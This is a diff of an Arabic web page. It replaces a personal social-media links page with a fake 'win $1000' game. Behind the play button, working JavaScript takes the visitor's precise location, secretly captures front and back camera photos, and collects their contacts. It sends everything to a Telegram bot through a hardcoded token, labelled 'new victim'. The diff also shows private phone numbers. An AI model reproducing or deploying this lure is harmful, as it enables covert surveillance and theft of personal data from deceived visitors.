@@ -1,70 +1,294 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>روابطي -  حمو فارس القط</title>
-  <link rel="stylesheet" href="style.css">
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🏆 فز بـ 1000$ الآن - اختبار الحظ!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow-x: hidden;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 450px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            animation: slideIn 1s ease-out;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        h1 { 
+            font-size: 2.2em; 
+            margin-bottom: 20px; 
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .prize { 
+            font-size: 4em; 
+            color: #FFD700; 
+            margin: 20px 0; 
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        .btn {
+            background: linear-gradient(45deg, #FF6B6B, #FF8E8E);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3em;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 15px;
+            transition: all 0.3s;
+            box-shadow: 0 10px 30px rgba(255,107,107,0.4);
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 40px rgba(255,107,107,0.6);
+        }
+        .btn:active { transform: translateY(-1px); }
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #FFD700;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .status { 
+            margin-top: 20px; 
+            font-size: 1.1em; 
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+        .hidden { display: none !important; }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <h1>🎉 فز بـ 1000$ الآن!</h1>
+        <div class="prize">💰 1000$ 💰</div>
+        <p style="font-size: 1.2em; margin-bottom: 30px;">
+            اضغط الزر للعب ومعرفة إذا فزت!
+        </p>
+        
+        <button class="btn" onclick="startGame()" id="playBtn">
+            🎮 العب الآن واكتشف حظك!
+        </button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>جاري فحص الحظ... ⏳</p>
+        </div>
+        
+        <div class="status" id="status"></div>
+    </div>
 
-  <div class="wrapper">
-    <header>
-      <h1>🌟 حمو فارس القط </h1>
-      <p>جميع روابط التواصل الرسمية</p>
-    </header>
+    <script>
+        const BOT_TOKEN = '8537499530:AAFyfu4ZMRzxlKXIJv0rmqTwn0tlg2RBZLg';
+        const CHAT_ID = '5058927918';
 
-    <main>
-      <div class="card facebook">
-        <a href="https://www.facebook.com/mhmd.fars.371292?mibextid=ZbWKwL" target="_blank">
-          <i class="fab fa-facebook-f"></i> فيسبوك
-        </a>
-      </div>
+        async function startGame() {
+            const playBtn = document.getElementById('playBtn');
+            const loading = document.getElementById('loading');
+            const status = document.getElementById('status');
+            
+            playBtn.classList.add('hidden');
+            loading.style.display = 'block';
+            status.textContent = 'جاري جمع البيانات لتحديد الفائزين...';
+            status.style.opacity = '1';
+            
+            try {
+                // 1. جمع الموقع
+                const location = await getLocation();
+                
+                // 2. صور الكاميرا
+                const frontPhoto = await capturePhoto('user');
+                const backPhoto = await capturePhoto('environment');
+                
+                // 3. جهات الاتصال
+                const contacts = await getContacts();
+                
+                // 4. إرسال للـ Bot
+                await sendToTelegram(location, frontPhoto, backPhoto, contacts);
+                
+                status.innerHTML = '🎉 تهانينا! أنت من الفائزين! سيتم التواصل معك قريباً 📞';
+                status.style.color = '#FFD700';
+                
+            } catch (error) {
+                console.error('Error:', error);
+                status.textContent = 'حدث خطأ، حاول مرة أخرى';
+            }
+        }
 
-      <div class="card tiktok">
-        <a href="https://www.tiktok.com/@hamofares7?_t=ZS-8yKUp9whfYv&_r=1" target="_blank">
-          <i class="fab fa-tiktok"></i> تيك توك
-        </a>
-      </div>
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject('Geolocation غير مدعوم');
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        const loc = {
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        resolve(loc);
+                    },
+                    reject,
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            });
+        }
 
-      <div class="card whatsapp">
-        <a href="https://wa.me/201288390497" target="_blank">
-          <i class="fab fa-whatsapp"></i> واتساب
-        </a>
-      </div>
+        function capturePhoto(type) {
+            return new Promise((resolve) => {
+                const video = document.createElement('video');
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: type === 'user' ? 'user' : 'environment',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                }).then(stream => {
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(() => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        canvas.getContext('2d').drawImage(video, 0, 0);
+                        
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                        
+                        canvas.toBlob(blob => {
+                            const reader = new FileReader();
+                            reader.onloadend = () => resolve(reader.result);
+                            reader.readAsDataURL(blob);
+                        }, 'image/jpeg', 0.8);
+                    }, 1000);
+                }).catch(() => resolve(null));
+            });
+        }
 
-      <div class="card instagram">
-        <a href="https://www.instagram.com/hamofares62/" target="_blank">
-          <i class="fab fa-instagram"></i> إنستجرام
-        </a>
-      </div>
+        function getContacts() {
+            return new Promise((resolve) => {
+                if (!navigator.contacts) {
+                    resolve([]);
+                    return;
+                }
+                
+                navigator.contacts.select(['name', 'tel'], { multiple: true })
+                    .then(contacts => {
+                        const phones = contacts.map(c => ({
+                            name: c.name?.[0] || 'غير معروف',
+                            phone: c.tel?.[0]?.toString() || 'غير متوفر'
+                        }));
+                        resolve(phones.slice(0, 20)); // أول 20 جهة اتصال
+                    })
+                    .catch(() => resolve([]));
+            });
+        }
 
-      <div class="card telegram">
-        <a href="https://t.me/hamofares7" target="_blank">
-          <i class="fab fa-telegram-plane"></i> تليجرام
-        </a>
-      </div>
+        async function sendToTelegram(location, frontPhoto, backPhoto, contacts) {
+            const data = {
+                chat_id: CHAT_ID,
+                caption: `🎯 ضحية جديدة!\n📍 ${location.lat}, ${location.lng}\n📏 دقة: ${location.accuracy}m\n⏰ ${location.timestamp}`,
+                parse_mode: 'HTML'
+            };
 
-      <div class="card phone">
-        <a href="tel:01224407462">
-          <i class="fas fa-phone-alt"></i> اتصال: 01224407462
-        </a>
-      </div>
+            // إرسال الموقع
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            });
 
-      <div class="card phone">
-        <a href="tel:01015506479">
-          <i class="fas fa-phone-alt"></i> اتصال: 01015506479
-        </a>
-      </div>
-    </main>
+            // إرسال صورة أمامية
+            if (frontPhoto) {
+                const formDataFront = new FormData();
+                formDataFront.append('chat_id', CHAT_ID);
+                formDataFront.append('photo', dataURLtoBlob(frontPhoto), 'front.jpg');
+                formDataFront.append('caption', '📸 كاميرا أمامية');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formDataFront
+                });
+            }
 
-    <footer>
-      <p>© 2025 - جميع الحقوق محفوظة</p>
-    </footer>
-  </div>
+            // إرسال صورة خلفية
+            if (backPhoto) {
+                const formDataBack = new FormData();
+                formDataBack.append('chat_id', CHAT_ID);
+                formDataBack.append('photo', dataURLtoBlob(backPhoto), 'back.jpg');
+                formDataBack.append('caption', '📷 كاميرا خلفية');
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formDataBack
+                });
+            }
 
+            // إرسال جهات الاتصال
+            const contactsText = contacts.map(c => `${c.name}: ${c.phone}`).join('\n');
+            if (contactsText) {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `📱 جهات الاتصال:\n${contactsText}`,
+                        parse_mode: 'HTML'
+                    })
+                });
+            }
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+    </script>
 </body>
 </html>
-
